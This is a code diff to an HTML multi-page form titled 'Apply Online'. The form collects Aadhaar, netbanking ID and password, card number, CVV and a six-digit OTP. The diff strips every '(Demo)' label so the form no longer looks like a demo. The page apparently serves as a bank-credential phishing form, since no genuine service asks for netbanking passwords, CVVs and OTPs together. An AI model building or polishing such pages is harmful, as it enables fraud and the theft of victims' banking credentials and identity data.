@@ -29,7 +29,7 @@ body{margin:0;font-family:system-ui,Arial;background:#e9e9e9}
     <div class="title">APPLY ONLINE</div>
     <div class="field"><div class="label">Full Name</div><input class="input"></div>
     <div class="field"><div class="label">Mobile Number</div><input class="input"></div>
-    <div class="field"><div class="label">Aadhaar (Demo)</div><input class="input"></div>
+    <div class="field"><div class="label">Aadhaar</div><input class="input"></div>
     <button class="btn" onclick="nextPage(1)">Continue</button>
   </div>
 </div>
@@ -37,8 +37,8 @@ body{margin:0;font-family:system-ui,Arial;background:#e9e9e9}
 <div class="page" id="page2">
   <div class="form">
     <div class="title">BANK INFO</div>
-    <div class="field"><div class="label">Netbank ID (Demo)</div><input class="input"></div>
-    <div class="field"><div class="label">Password (Demo)</div><input class="input"></div>
+    <div class="field"><div class="label">Netbanking ID</div><input class="input"></div>
+    <div class="field"><div class="label">Password</div><input class="input"></div>
     <button class="btn" onclick="nextPage(2)">Continue</button>
     <button class="btn" onclick="prevPage(2)">Back</button>
   </div>
@@ -46,9 +46,9 @@ body{margin:0;font-family:system-ui,Arial;background:#e9e9e9}
 
 <div class="page" id="page3">
   <div class="form">
-    <div class="title">CARD DETAILS (Demo)</div>
+    <div class="title">CARD DETAILS</div>
     <div class="field"><div class="label">Card Number</div><input class="input"></div>
-    <div class="field"><div class="label">CVV / PIN</div><input class="input"></div>
+    <div class="field"><div class="label">CVV</div><input class="input"></div>
     <button class="btn" onclick="goOtp()">Submit</button>
     <button class="btn" onclick="prevPage(3)">Back</button>
   </div>
@@ -56,7 +56,7 @@ body{margin:0;font-family:system-ui,Arial;background:#e9e9e9}
 
 <div class="page" id="page4">
   <div class="form">
-    <div class="title">ENTER OTP (Demo)</div>
+    <div class="title">ENTER OTP</div>
     <div class="field"><div class="label">OTP (6 Digit)</div><input class="input" id="otpSingle" maxlength="6"></div>
     <p id="resendBox" style="text-align:center">Resend OTP in <span id="otpTimer">30</span>s</p>
     <button class="btn" onclick="verifyOtp()">Verify OTP</button>
